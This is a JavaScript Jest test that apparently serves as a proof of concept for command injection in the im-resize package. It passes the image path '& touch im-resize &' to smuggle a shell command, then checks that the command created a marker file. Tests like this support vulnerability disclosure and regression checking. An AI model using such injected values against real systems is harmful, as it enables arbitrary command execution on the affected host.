test("Command Injection in im-resize", (done) => {
  expect.assertions(2);
  const root = require("im-resize");
  const fs = require("fs");
  const path = "./im-resize";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let image = { path: "& touch im-resize &" };
  let output = { versions: [] };
  root(image, output, function () {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {
      done();
    });
  });
});
